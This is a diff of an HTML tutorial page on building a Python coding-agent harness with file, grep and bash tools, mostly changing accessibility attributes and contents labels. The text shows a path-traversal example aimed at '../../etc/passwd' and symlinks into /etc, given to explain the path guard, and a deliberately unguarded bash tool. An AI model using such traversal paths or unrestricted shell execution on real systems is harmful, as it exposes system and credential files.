@@ -14,7 +14,7 @@
 <div class="layout">
 <details class="sidebar-wrap" open>
 <summary class="sidebar-toggle">Guide navigation</summary>
-<nav class="sidebar">
+<nav class="sidebar" aria-label="Guide pages">
 <p class="sidebar-heading">Start here</p>
 <ul>
 <li><a href="index.html">Guide hub</a></li>
@@ -48,7 +48,7 @@
 </details>
 <main id="main">
 <header class="page-header">
-<p class="source-link"><a href="https://github.com/joshps23/ai-eng-2/blob/main/agent-harness-guide/04-real-tools.md">View the markdown source on GitHub</a></p>
+<p class="source-link"><a class="repo-file" href="https://github.com/joshps23/ai-eng-2/blob/main/agent-harness-guide/04-real-tools.md" title="Requires access to the repository">View the markdown source on GitHub</a></p>
 <details class="page-toc">
 <summary>On this page</summary>
 <ul>
@@ -63,7 +63,7 @@
 </li>
 <li class="toc-h2"><a href="#version-1--line-by-line-the-agent-touches-your-disk-no-def-no-classes">Version 1 — line-by-line: the agent touches your disk (no def, no classes)</a>
 <ul>
-<li class="toc-h3"><a href="#-run-it-now">▶ Run it now — Version 1 — line-by-line: the agent touches your disk (no def, no classes)</a></li>
+<li class="toc-h3"><a href="#-run-it-now">▶ Run it now — Version 1</a></li>
 </ul>
 </li>
 <li class="toc-h2"><a href="#version-2--functions-the-toolset-grows-one-tool-at-a-time">Version 2 — functions: the toolset grows, one tool at a time</a>
@@ -73,46 +73,46 @@
 </li>
 <li class="toc-h2"><a href="#step-20--read_file-becomes-a-named-function">Step 2.0 — read_file becomes a named function</a>
 <ul>
-<li class="toc-h3"><a href="#-run-it-now-1">▶ Run it now — Step 2.0 — read_file becomes a named function</a></li>
+<li class="toc-h3"><a href="#-run-it-now-1">▶ Run it now — Step 2.0</a></li>
 </ul>
 </li>
 <li class="toc-h2"><a href="#step-21--add-list_dir-and-glob-read-only-low-risk">Step 2.1 — Add list_dir and glob (read-only, low risk)</a>
 <ul>
 <li class="toc-h3"><a href="#list_dir">list_dir</a></li>
 <li class="toc-h3"><a href="#glob">glob</a></li>
-<li class="toc-h3"><a href="#-run-it-now-2">▶ Run it now — Step 2.1 — Add list_dir and glob (read-only, low risk)</a></li>
+<li class="toc-h3"><a href="#-run-it-now-2">▶ Run it now — glob</a></li>
 </ul>
 </li>
 <li class="toc-h2"><a href="#step-22--add-grep-still-read-only-slightly-more-complex">Step 2.2 — Add grep (still read-only, slightly more complex)</a>
 <ul>
-<li class="toc-h3"><a href="#-run-it-now-3">▶ Run it now — Step 2.2 — Add grep (still read-only, slightly more complex)</a></li>
+<li class="toc-h3"><a href="#-run-it-now-3">▶ Run it now — Step 2.2</a></li>
 </ul>
 </li>
 <li class="toc-h2"><a href="#step-23--safety-first-add-_safe_path-and-_truncate-before-writing-anything">Step 2.3 — Safety First: add _safe_path and _truncate before writing anything</a>
 <ul>
 <li class="toc-h3"><a href="#_safe_path--the-path-guard">_safe_path — the Path Guard</a></li>
 <li class="toc-h3"><a href="#_truncate--the-output-size-guard">_truncate — the Output Size Guard</a></li>
-<li class="toc-h3"><a href="#-check-it-now-no-api-key-needed">▶ Check it now (no API key needed) — Step 2.3 — Safety First: add _safe_path and _truncate before writing anything</a></li>
+<li class="toc-h3"><a href="#-check-it-now-no-api-key-needed">▶ Check it now (no API key needed) — _truncate</a></li>
 </ul>
 </li>
 <li class="toc-h2"><a href="#step-24--add-write_file-medium-risk--destructive">Step 2.4 — Add write_file (medium risk — destructive)</a>
 <ul>
-<li class="toc-h3"><a href="#-run-it-now-4">▶ Run it now — Step 2.4 — Add write_file (medium risk — destructive)</a></li>
+<li class="toc-h3"><a href="#-run-it-now-4">▶ Run it now — Step 2.4</a></li>
 </ul>
 </li>
 <li class="toc-h2"><a href="#step-25--add-edit_file--the-surgical-edit-tool-medium-risk">Step 2.5 — Add edit_file — the Surgical Edit Tool (medium risk)</a>
 <ul>
-<li class="toc-h3"><a href="#-run-it-now-5">▶ Run it now — Step 2.5 — Add edit_file — the Surgical Edit Tool (medium risk)</a></li>
+<li class="toc-h3"><a href="#-run-it-now-5">▶ Run it now — Step 2.5</a></li>
 </ul>
 </li>
 <li class="toc-h2"><a href="#step-26--add-bash-high-risk--arbitrary-execution">Step 2.6 — Add bash (high risk — arbitrary execution)</a>
 <ul>
-<li class="toc-h3"><a href="#-run-it-now-6">▶ Run it now — Step 2.6 — Add bash (high risk — arbitrary execution)</a></li>
+<li class="toc-h3"><a href="#-run-it-now-6">▶ Run it now — Step 2.6</a></li>
 </ul>
 </li>
 <li class="toc-h2"><a href="#step-27--version-2-complete-the-whole-harness-in-one-file">Step 2.7 — Version 2, complete: the whole harness in one file</a>
 <ul>
-<li class="toc-h3"><a href="#-run-it-now-7">▶ Run it now — Step 2.7 — Version 2, complete: the whole harness in one file</a></li>
+<li class="toc-h3"><a href="#-run-it-now-7">▶ Run it now — Step 2.7</a></li>
 </ul>
 </li>
 <li class="toc-h2"><a href="#version-3--the-organized-toolset-the-same-idea-organized">Version 3 — the organized toolset: the same idea, organized</a>
@@ -141,7 +141,7 @@
 </li>
 <li class="toc-h2"><a href="#version-3-reference--registering-everything-make_default_registry">Version 3 reference — registering everything: make_default_registry</a>
 <ul>
-<li class="toc-h3"><a href="#-check-it-now-no-api-key-needed-1">▶ Check it now (no API key needed) — Version 3 reference — registering everything: make_default_registry</a></li>
+<li class="toc-h3"><a href="#-check-it-now-no-api-key-needed-1">▶ Check it now (no API key needed) — Version 3 reference</a></li>
 </ul>
 </li>
 <li class="toc-h2"><a href="#toolset-reference-table">Toolset reference table</a>
@@ -150,7 +150,7 @@
 <ul>
 <li class="toc-h3"><a href="#demo-setup">Demo setup</a></li>
 <li class="toc-h3"><a href="#the-demo-agent-loop">The demo agent loop</a></li>
-<li class="toc-h3"><a href="#-run-it-now-8">▶ Run it now — Step 3.3 — the end-to-end demo</a></li>
+<li class="toc-h3"><a href="#-run-it-now-8">▶ Run it now — The demo agent loop</a></li>
 <li class="toc-h3"><a href="#transcript-representative-output">Transcript (representative output)</a></li>
 </ul>
 </li>
@@ -163,7 +163,7 @@
 </li>
 <li class="toc-h2"><a href="#version-3-reference--the-complete-coding_toolspy">Version 3 reference — the complete coding_tools.py</a>
 <ul>
-<li class="toc-h3"><a href="#-check-it-now-no-api-key-needed-2">▶ Check it now (no API key needed) — Version 3 reference — the complete coding_tools.py</a></li>
+<li class="toc-h3"><a href="#-check-it-now-no-api-key-needed-2">▶ Check it now (no API key needed) — Version 3 reference</a></li>
 </ul>
 </li>
 <li class="toc-h2"><a href="#what-comes-next">What comes next</a>
@@ -197,7 +197,7 @@ Python stdlib. No frameworks, no third-party packages beyond <code>openai</code>
 </blockquote>
 <hr>
 <blockquote class="beginner">
-<h2 id="-beginner-track-good-news--this-phase-is-mostly-plain-functions">🟢 Beginner track: good news — this phase is mostly plain functions<a aria-hidden="true" class="hanchor" href="#-beginner-track-good-news--this-phase-is-mostly-plain-functions" tabindex="-1">¶</a></h2>
+<h2 id="-beginner-track-good-news--this-phase-is-mostly-plain-functions">🟢 Beginner track: good news — this phase is mostly plain functions<a aria-label="Permalink to this section" class="hanchor" href="#-beginner-track-good-news--this-phase-is-mostly-plain-functions">¶</a></h2>
 <p>Each tool below (<code>read_file</code>, <code>write_file</code>, <code>bash</code>, <code>grep</code>, …) is <strong>an ordinary
 function</strong> built from things you know: <code>if</code>/<code>else</code>, <code>for</code>, lists, dicts, string
 operators, and <code>return</code>. You can read every tool body directly. A few heads-ups so
@@ -229,7 +229,7 @@ nothing trips you up:</p>
 <p>With those five notes, the entire phase is readable with your five concepts.</p>
 </blockquote>
 <hr>
-<h2 id="the-shape-of-this-phase-three-versions-of-one-harness">The shape of this phase: three versions of one harness<a aria-hidden="true" class="hanchor" href="#the-shape-of-this-phase-three-versions-of-one-harness" tabindex="-1">¶</a></h2>
+<h2 id="the-shape-of-this-phase-three-versions-of-one-harness">The shape of this phase: three versions of one harness<a aria-label="Permalink to this section" class="hanchor" href="#the-shape-of-this-phase-three-versions-of-one-harness">¶</a></h2>
 <p>Like every phase in this guide, Phase 4 is a <strong>ladder of complete, runnable versions of
 the same harness</strong> — not one big program revealed all at once. Each version does the
 same job; only the organization changes:</p>
@@ -251,7 +251,7 @@ same job; only the organization changes:</p>
 looking at a reorganization of a program you already ran — never a brand-new one.</p>
 <p><strong>Contents:</strong></p>
 <blockquote>
-<p><strong>Prefer running this phase as a notebook?</strong> <a class="repo-file" href="../../notebooks/04-real-tools.ipynb" title="Opens a file in the repository checkout — not part of this site"><code>notebooks/04-real-tools.ipynb</code></a> executes this phase's runnable core offline — see <a href="notebooks.html">notebooks/README.md</a>.</p>
+<p><strong>Prefer running this phase as a notebook?</strong> <a class="repo-file" href="https://github.com/joshps23/ai-eng-2/blob/main/agent-harness-guide/notebooks/04-real-tools.ipynb" title="Opens the notebook on GitHub (requires repo access) — or use its Open-in-Colab badge"><code>notebooks/04-real-tools.ipynb</code></a> executes this phase's runnable core offline — see <a href="notebooks.html">notebooks/README.md</a>.</p>
 </blockquote>
 <ul>
 <li><a href="#why-tools-define-the-agents-power">Why tools define the agent's power</a></li>
@@ -265,14 +265,14 @@ looking at a reorganization of a program you already ran — never a brand-new o
 <li><a href="#pitfalls">Pitfalls</a></li>
 </ul>
 <hr>
-<h2 id="why-tools-define-the-agents-power">Why tools define the agent's power<a aria-hidden="true" class="hanchor" href="#why-tools-define-the-agents-power" tabindex="-1">¶</a></h2>
+<h2 id="why-tools-define-the-agents-power">Why tools define the agent's power<a aria-label="Permalink to this section" class="hanchor" href="#why-tools-define-the-agents-power">¶</a></h2>
 <p>The loop from Phase 1 is the skeleton. Tools are the muscles. A model that can only
 reason about code it has seen in its context window is helpless against a real codebase.
 Give it <code>read_file</code> and it can inspect any source file. Give it <code>edit_file</code> and it can
 make precise surgical changes. Give it <code>bash</code> and it can run tests, install packages,
 and observe the results. The combination is what makes Claude Code — and what we are
 building here — feel like a capable pair-programmer rather than a sophisticated autocomplete.</p>
-<h3 id="design-principles-for-agent-tools">Design principles for agent tools<a aria-hidden="true" class="hanchor" href="#design-principles-for-agent-tools" tabindex="-1">¶</a></h3>
+<h3 id="design-principles-for-agent-tools">Design principles for agent tools<a aria-label="Permalink to this section" class="hanchor" href="#design-principles-for-agent-tools">¶</a></h3>
 <p>These principles apply to every tool in this phase and to any tool you will write in the
 future. They are not suggestions; violating them reliably produces broken agents.</p>
 <p><strong>(a) Clear, model-facing descriptions.</strong>
@@ -305,7 +305,7 @@ path guards, a malicious or confused model can write to <code>../../etc/passwd</
 secrets outside the project. Every path-taking tool calls <code>_safe_path()</code> which resolves
 the path and asserts it stays within <code>WORKSPACE_ROOT</code>.</p>
 <hr>
-<h2 id="version-1--line-by-line-the-agent-touches-your-disk-no-def-no-classes">Version 1 — line-by-line: the agent touches your disk (no <code>def</code>, no classes)<a aria-hidden="true" class="hanchor" href="#version-1--line-by-line-the-agent-touches-your-disk-no-def-no-classes" tabindex="-1">¶</a></h2>
+<h2 id="version-1--line-by-line-the-agent-touches-your-disk-no-def-no-classes">Version 1 — line-by-line: the agent touches your disk (no <code>def</code>, no classes)<a aria-label="Permalink to this section" class="hanchor" href="#version-1--line-by-line-the-agent-touches-your-disk-no-def-no-classes">¶</a></h2>
 <p>Before adding all seven tools, shared helpers, and the registry factory, let's get <strong>one
 tool working end-to-end</strong> so you can see the whole circuit light up.</p>
 <p>We will start with <code>read_file</code> — the simplest, safest tool. It reads a file and returns
@@ -404,7 +404,7 @@ the phrase <em>"the agent can now touch your disk"</em> stops being abstract.</p
         <span class="p">})</span>
 </code></pre></div>
 
-<h3 id="-run-it-now">▶ Run it now<a aria-hidden="true" class="hanchor" href="#-run-it-now" tabindex="-1">¶</a></h3>
+<h3 id="-run-it-now">▶ Run it now<a aria-label="Permalink to this section" class="hanchor" href="#-run-it-now">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">OPENAI_API_KEY</span><span class="o">=</span>sk-...
 python<span class="w"> </span>v1_inline_read.py
 </code></pre></div>
@@ -424,8 +424,8 @@ approval for the dangerous calls.</p>
 <p>One tool, one schema dict, an inline <code>try</code>/<code>except</code> — that is the whole circuit. The
 rest of this phase is the same circuit, scaled up and reorganized.</p>
 <hr>
-<h2 id="version-2--functions-the-toolset-grows-one-tool-at-a-time">Version 2 — functions: the toolset grows, one tool at a time<a aria-hidden="true" class="hanchor" href="#version-2--functions-the-toolset-grows-one-tool-at-a-time" tabindex="-1">¶</a></h2>
-<h3 id="what-changed-from-v1-to-v2">What changed from V1 to V2<a aria-hidden="true" class="hanchor" href="#what-changed-from-v1-to-v2" tabindex="-1">¶</a></h3>
+<h2 id="version-2--functions-the-toolset-grows-one-tool-at-a-time">Version 2 — functions: the toolset grows, one tool at a time<a aria-label="Permalink to this section" class="hanchor" href="#version-2--functions-the-toolset-grows-one-tool-at-a-time">¶</a></h2>
+<h3 id="what-changed-from-v1-to-v2">What changed from V1 to V2<a aria-label="Permalink to this section" class="hanchor" href="#what-changed-from-v1-to-v2">¶</a></h3>
 <ul>
 <li>The inline <code>try</code>/<code>except open(...)</code> block moves out of the dispatch branch into a
   named function, <code>read_file(path)</code> — the loop just calls <code>read_file(**args)</code>.</li>
@@ -443,7 +443,7 @@ rest of this phase is the same circuit, scaled up and reorganized.</p>
 maps tool names to functions. No classes, no decorators — everything here is <code>def</code>,
 <code>if</code>/<code>else</code>, lists, dicts, and <code>return</code>. We build the toolset one tool per step, each
 with its own run checkpoint, ordered from safest (read-only) to most dangerous (<code>bash</code>).</p>
-<h2 id="step-20--read_file-becomes-a-named-function">Step 2.0 — <code>read_file</code> becomes a named function<a aria-hidden="true" class="hanchor" href="#step-20--read_file-becomes-a-named-function" tabindex="-1">¶</a></h2>
+<h2 id="step-20--read_file-becomes-a-named-function">Step 2.0 — <code>read_file</code> becomes a named function<a aria-label="Permalink to this section" class="hanchor" href="#step-20--read_file-becomes-a-named-function">¶</a></h2>
 <p>In Version 1 the file-reading logic lived inside the dispatch branch. The first move of
 Version 2 is to lift it out into a function with a name, so the loop reads as <em>what</em>
 happens (call the tool) rather than <em>how</em> (open, read, catch errors).</p>
@@ -548,7 +548,7 @@ happens (call the tool) rather than <em>how</em> (open, read, catch errors).</p>
     <span class="n">run</span><span class="p">(</span><span class="s2">&quot;What is in the file hello.txt?&quot;</span><span class="p">)</span>
 </code></pre></div>
 
-<h3 id="-run-it-now-1">▶ Run it now<a aria-hidden="true" class="hanchor" href="#-run-it-now-1" tabindex="-1">¶</a></h3>
+<h3 id="-run-it-now-1">▶ Run it now<a aria-label="Permalink to this section" class="hanchor" href="#-run-it-now-1">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">OPENAI_API_KEY</span><span class="o">=</span>sk-...
 python<span class="w"> </span>v2_read_file.py
 </code></pre></div>
@@ -567,12 +567,12 @@ tool has a name and the loop body stays short. Everything in the rest of this ph
 this same pattern, scaled up with more tools, better safety guards, and (in Version 3)
 the <code>@tool</code> / <code>ToolRegistry</code> machinery from Phase 2.</p>
 <hr>
-<h2 id="step-21--add-list_dir-and-glob-read-only-low-risk">Step 2.1 — Add <code>list_dir</code> and <code>glob</code> (read-only, low risk)<a aria-hidden="true" class="hanchor" href="#step-21--add-list_dir-and-glob-read-only-low-risk" tabindex="-1">¶</a></h2>
+<h2 id="step-21--add-list_dir-and-glob-read-only-low-risk">Step 2.1 — Add <code>list_dir</code> and <code>glob</code> (read-only, low risk)<a aria-label="Permalink to this section" class="hanchor" href="#step-21--add-list_dir-and-glob-read-only-low-risk">¶</a></h2>
 <p><strong>Why now?</strong> <code>read_file</code> is powerful, but the agent needs to <em>discover</em> files before it
 can read them. <code>list_dir</code> answers "what is in this directory?" and <code>glob</code> answers "which
 files match this pattern?" Both are read-only, so they carry no risk of data loss.</p>
 <p>Add these two functions and their schemas alongside <code>read_file</code>. Then wire them in.</p>
-<h3 id="list_dir"><code>list_dir</code><a aria-hidden="true" class="hanchor" href="#list_dir" tabindex="-1">¶</a></h3>
+<h3 id="list_dir"><code>list_dir</code><a aria-label="Permalink to this section" class="hanchor" href="#list_dir">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">pathlib</span>
 
 <span class="k">def</span><span class="w"> </span><span class="nf">list_dir</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
@@ -602,7 +602,7 @@ first by <code>e.is_file()</code> — and since <code>False &lt; True</code>, di
 <code>False</code>) sort before files — then ties are broken by the lowercased name. One line,
 two sort criteria.</p>
 </blockquote>
-<h3 id="glob"><code>glob</code><a aria-hidden="true" class="hanchor" href="#glob" tabindex="-1">¶</a></h3>
+<h3 id="glob"><code>glob</code><a aria-label="Permalink to this section" class="hanchor" href="#glob">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">glob</span><span class="p">(</span><span class="n">pattern</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
 <span class="w">    </span><span class="sd">&quot;&quot;&quot;Find files matching a glob pattern.&quot;&quot;&quot;</span>
     <span class="k">try</span><span class="p">:</span>
@@ -668,14 +668,14 @@ the model knows what happens when it omits the argument.</p>
 <span class="n">result</span> <span class="o">=</span> <span class="n">tool_fns</span><span class="p">[</span><span class="n">tc</span><span class="o">.</span><span class="n">name</span><span class="p">](</span><span class="o">**</span><span class="n">args</span><span class="p">)</span>
 </code></pre></div>
 
-<h3 id="-run-it-now-2">▶ Run it now<a aria-hidden="true" class="hanchor" href="#-run-it-now-2" tabindex="-1">¶</a></h3>
+<h3 id="-run-it-now-2">▶ Run it now<a aria-label="Permalink to this section" class="hanchor" href="#-run-it-now-2">¶</a></h3>
 <p>Change the task string to:</p>
 <div class="highlight"><pre><span></span><code><span class="n">run</span><span class="p">(</span><span class="s2">&quot;List the files in the current directory, then read hello.txt.&quot;</span><span class="p">)</span>
 </code></pre></div>
 
 <p>You should see the model call <code>list_dir(".")</code> first, then <code>read_file("hello.txt")</code>.</p>
 <hr>
-<h2 id="step-22--add-grep-still-read-only-slightly-more-complex">Step 2.2 — Add <code>grep</code> (still read-only, slightly more complex)<a aria-hidden="true" class="hanchor" href="#step-22--add-grep-still-read-only-slightly-more-complex" tabindex="-1">¶</a></h2>
+<h2 id="step-22--add-grep-still-read-only-slightly-more-complex">Step 2.2 — Add <code>grep</code> (still read-only, slightly more complex)<a aria-label="Permalink to this section" class="hanchor" href="#step-22--add-grep-still-read-only-slightly-more-complex">¶</a></h2>
 <p><strong>Why now?</strong> Once the agent can list and glob files, the natural next step is to search
 <em>inside</em> them. <code>grep</code> replaces dozens of <code>read_file</code> calls with one targeted search.
 It is still read-only — no risk of data loss.</p>
@@ -743,7 +743,7 @@ parameters have defaults, so only <code>pattern</code> is <code>"required"</code
 </code></pre></div>
 
 <p>Add <code>GREP_SCHEMA</code> to the <code>tools=[...]</code> list and <code>grep</code> to the dispatch dict, then:</p>
-<h3 id="-run-it-now-3">▶ Run it now<a aria-hidden="true" class="hanchor" href="#-run-it-now-3" tabindex="-1">¶</a></h3>
+<h3 id="-run-it-now-3">▶ Run it now<a aria-label="Permalink to this section" class="hanchor" href="#-run-it-now-3">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="c1"># Create a file with a TODO first</span>
 <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;notes.py&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
     <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;# TODO: finish this</span><span class="se">\n</span><span class="s2">x = 1</span><span class="se">\n</span><span class="s2"># TODO: add tests</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
@@ -758,12 +758,12 @@ you kept it in the same file) contain the word "TODO". Those extra hits are not 
 they are your first taste of the agent's tools seeing <em>everything</em> in the workspace,
 including the agent's own source file.</p>
 <hr>
-<h2 id="step-23--safety-first-add-_safe_path-and-_truncate-before-writing-anything">Step 2.3 — Safety First: add <code>_safe_path</code> and <code>_truncate</code> before writing anything<a aria-hidden="true" class="hanchor" href="#step-23--safety-first-add-_safe_path-and-_truncate-before-writing-anything" tabindex="-1">¶</a></h2>
+<h2 id="step-23--safety-first-add-_safe_path-and-_truncate-before-writing-anything">Step 2.3 — Safety First: add <code>_safe_path</code> and <code>_truncate</code> before writing anything<a aria-label="Permalink to this section" class="hanchor" href="#step-23--safety-first-add-_safe_path-and-_truncate-before-writing-anything">¶</a></h2>
 <p><strong>Why now?</strong> So far all our tools are read-only — if they misbehave the worst case is
 the model sees garbled text. We are about to add <code>write_file</code> and <code>edit_file</code>, which can
 destroy data. Before we do that, let's add two small safety helpers that every
 subsequent tool will use.</p>
-<h3 id="_safe_path--the-path-guard"><code>_safe_path</code> — the Path Guard<a aria-hidden="true" class="hanchor" href="#_safe_path--the-path-guard" tabindex="-1">¶</a></h3>
+<h3 id="_safe_path--the-path-guard"><code>_safe_path</code> — the Path Guard<a aria-label="Permalink to this section" class="hanchor" href="#_safe_path--the-path-guard">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
 
 <span class="n">WORKSPACE_ROOT</span> <span class="o">=</span> <span class="n">pathlib</span><span class="o">.</span><span class="n">Path</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">())</span><span class="o">.</span><span class="n">resolve</span><span class="p">()</span>
@@ -811,7 +811,7 @@ A symlink at <code>workspace/link -&gt; /etc</code> would pass a naive string ch
 actually walks the filesystem, so a symlink pointing outside the workspace is caught.
 The cost is an extra syscall per path; that is entirely acceptable.</p>
 </blockquote>
-<h3 id="_truncate--the-output-size-guard"><code>_truncate</code> — the Output Size Guard<a aria-hidden="true" class="hanchor" href="#_truncate--the-output-size-guard" tabindex="-1">¶</a></h3>
+<h3 id="_truncate--the-output-size-guard"><code>_truncate</code> — the Output Size Guard<a aria-label="Permalink to this section" class="hanchor" href="#_truncate--the-output-size-guard">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="n">_DEFAULT_MAX_CHARS</span> <span class="o">=</span> <span class="mi">40_000</span>    <span class="c1"># ~10 k tokens at 4 chars/token — generous but bounded</span>
 <span class="n">_DEFAULT_MAX_LINES</span> <span class="o">=</span> <span class="mi">2_000</span>
 
@@ -863,7 +863,7 @@ adding two lines per function. For example, <code>read_file</code> becomes:</p>
     <span class="k">return</span> <span class="n">_truncate</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;read_file(</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>   <span class="c1"># NEW: cap the output</span>
 </code></pre></div>
 
-<h3 id="-check-it-now-no-api-key-needed">▶ Check it now (no API key needed)<a aria-hidden="true" class="hanchor" href="#-check-it-now-no-api-key-needed" tabindex="-1">¶</a></h3>
+<h3 id="-check-it-now-no-api-key-needed">▶ Check it now (no API key needed)<a aria-label="Permalink to this section" class="hanchor" href="#-check-it-now-no-api-key-needed">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="c1"># Should succeed</span>
 <span class="nb">print</span><span class="p">(</span><span class="n">read_file</span><span class="p">(</span><span class="s2">&quot;hello.txt&quot;</span><span class="p">))</span>
 
@@ -872,7 +872,7 @@ adding two lines per function. For example, <code>read_file</code> becomes:</p>
 </code></pre></div>
 
 <hr>
-<h2 id="step-24--add-write_file-medium-risk--destructive">Step 2.4 — Add <code>write_file</code> (medium risk — destructive)<a aria-hidden="true" class="hanchor" href="#step-24--add-write_file-medium-risk--destructive" tabindex="-1">¶</a></h2>
+<h2 id="step-24--add-write_file-medium-risk--destructive">Step 2.4 — Add <code>write_file</code> (medium risk — destructive)<a aria-label="Permalink to this section" class="hanchor" href="#step-24--add-write_file-medium-risk--destructive">¶</a></h2>
 <p><strong>Why now?</strong> The agent can now explore a codebase safely. Adding write capability means
 it can create new files. We add <code>write_file</code> before <code>edit_file</code> because creating files
 is easier to reason about — you are not changing something that already exists.</p>
@@ -899,7 +899,7 @@ a <strong>permissions layer</strong> that intercepts write operations on files t
 explicitly approved, surfacing a confirmation prompt before any bytes are written.
 For now, the tool is intentionally raw so we can focus on its mechanics without
 conflating it with the permission system.</p>
-<h3 id="-run-it-now-4">▶ Run it now<a aria-hidden="true" class="hanchor" href="#-run-it-now-4" tabindex="-1">¶</a></h3>
+<h3 id="-run-it-now-4">▶ Run it now<a aria-label="Permalink to this section" class="hanchor" href="#-run-it-now-4">¶</a></h3>
 <p>Add <code>write_file</code> to the dispatch dict, then:</p>
 <div class="highlight"><pre><span></span><code><span class="n">run</span><span class="p">(</span><span class="s2">&quot;Create a file called output.txt containing the text &#39;Hello from the agent!&#39;&quot;</span><span class="p">)</span>
 </code></pre></div>
@@ -909,7 +909,7 @@ conflating it with the permission system.</p>
 </code></pre></div>
 
 <hr>
-<h2 id="step-25--add-edit_file--the-surgical-edit-tool-medium-risk">Step 2.5 — Add <code>edit_file</code> — the Surgical Edit Tool (medium risk)<a aria-hidden="true" class="hanchor" href="#step-25--add-edit_file--the-surgical-edit-tool-medium-risk" tabindex="-1">¶</a></h2>
+<h2 id="step-25--add-edit_file--the-surgical-edit-tool-medium-risk">Step 2.5 — Add <code>edit_file</code> — the Surgical Edit Tool (medium risk)<a aria-label="Permalink to this section" class="hanchor" href="#step-25--add-edit_file--the-surgical-edit-tool-medium-risk">¶</a></h2>
 <p><strong>Why now?</strong> <code>write_file</code> overwrites a file completely. For modifying existing files the
 safer approach is to replace only the part that needs changing — which is exactly what
 <code>edit_file</code> does.</p>
@@ -1014,7 +1014,7 @@ two places, we do not know which one the model intended, so we reject the operat
 ask for more context. This is a conservative, correct default.</p>
 <p>Claude Code uses this exact approach. The technique is sometimes called
 <strong>positional-free patching</strong> or <strong>semantic patching</strong>.</p>
-<h3 id="-run-it-now-5">▶ Run it now<a aria-hidden="true" class="hanchor" href="#-run-it-now-5" tabindex="-1">¶</a></h3>
+<h3 id="-run-it-now-5">▶ Run it now<a aria-label="Permalink to this section" class="hanchor" href="#-run-it-now-5">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="c1"># Create a file to edit</span>
 <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;greeting.py&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
     <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;def greet(name):</span><span class="se">\n</span><span class="s1">    return &quot;Hello, &quot; + name</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
@@ -1027,7 +1027,7 @@ ask for more context. This is a conservative, correct default.</p>
 </code></pre></div>
 
 <hr>
-<h2 id="step-26--add-bash-high-risk--arbitrary-execution">Step 2.6 — Add <code>bash</code> (high risk — arbitrary execution)<a aria-hidden="true" class="hanchor" href="#step-26--add-bash-high-risk--arbitrary-execution" tabindex="-1">¶</a></h2>
+<h2 id="step-26--add-bash-high-risk--arbitrary-execution">Step 2.6 — Add <code>bash</code> (high risk — arbitrary execution)<a aria-label="Permalink to this section" class="hanchor" href="#step-26--add-bash-high-risk--arbitrary-execution">¶</a></h2>
 <p><strong>Why now?</strong> You have all the safe, targeted tools. <code>bash</code> is the escape hatch — it lets
 the agent run any shell command, including tests, package installs, and build scripts.
 We add it last because it carries the highest risk. Once you understand its power and
@@ -1116,13 +1116,13 @@ returning nothing useful. The model should know to use <code>python3 script.py</
 <p>Setting <code>cwd=WORKSPACE_ROOT</code> means the model can write <code>bash("ls src/")</code> and get the
 right listing without needing to know the absolute path. It mirrors how a developer
 would open a terminal in the project root.</p>
-<h3 id="-run-it-now-6">▶ Run it now<a aria-hidden="true" class="hanchor" href="#-run-it-now-6" tabindex="-1">¶</a></h3>
+<h3 id="-run-it-now-6">▶ Run it now<a aria-label="Permalink to this section" class="hanchor" href="#-run-it-now-6">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="n">run</span><span class="p">(</span><span class="s2">&quot;Run &#39;echo Hello from bash&#39; as a shell command and tell me what it printed.&quot;</span><span class="p">)</span>
 </code></pre></div>
 
 <p>You should see <code>bash</code> called with that command and the output echoed back.</p>
 <hr>
-<h2 id="step-27--version-2-complete-the-whole-harness-in-one-file">Step 2.7 — Version 2, complete: the whole harness in one file<a aria-hidden="true" class="hanchor" href="#step-27--version-2-complete-the-whole-harness-in-one-file" tabindex="-1">¶</a></h2>
+<h2 id="step-27--version-2-complete-the-whole-harness-in-one-file">Step 2.7 — Version 2, complete: the whole harness in one file<a aria-label="Permalink to this section" class="hanchor" href="#step-27--version-2-complete-the-whole-harness-in-one-file">¶</a></h2>
 <p>You have built every piece across Steps 2.0–2.6. Here is <strong>Version 2 as one complete,
 runnable program</strong> — the harness, the two safety helpers, and the four core tools
 (<code>read_file</code>, <code>write_file</code>, <code>list_dir</code>, <code>bash</code>) with their hand-written schema dicts and
@@ -1355,7 +1355,7 @@ the dispatch dict. Still no classes, no decorators.</p>
 <p>The other three tools you built — <code>glob</code> (Step 2.1), <code>grep</code> (Step 2.2), and <code>edit_file</code>
